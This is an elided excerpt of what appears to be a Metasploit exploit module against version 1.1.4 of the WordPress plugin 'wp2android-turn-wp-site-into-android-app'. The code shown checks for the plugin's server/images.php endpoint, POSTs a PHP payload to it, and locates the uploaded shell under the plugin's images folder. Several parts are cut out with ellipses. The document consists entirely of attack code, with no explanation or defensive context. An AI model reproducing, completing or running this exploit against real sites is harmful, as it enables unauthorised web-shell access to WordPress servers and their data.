...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
    super(update_info(info,
      ...
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4', {}]],
  ...
  def check
    ...
    uri << '/' if uri[-1,1] != '/'
    checkScript = send_request_raw({'uri'=>normalize_uri(wordpress_url_plugins, 'wp2android-turn-wp-site-into-android-app','server','images.php')})
  ...
  def exploit
    ...
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(wordpress_url_plugins, 'wp2android-turn-wp-site-into-android-app','server','images.php'),
	...
	@shellLoc  = normalize_uri(wordpress_url_plugins, 'wp2android-turn-wp-site-into-android-app','server','images',respShell.strip)
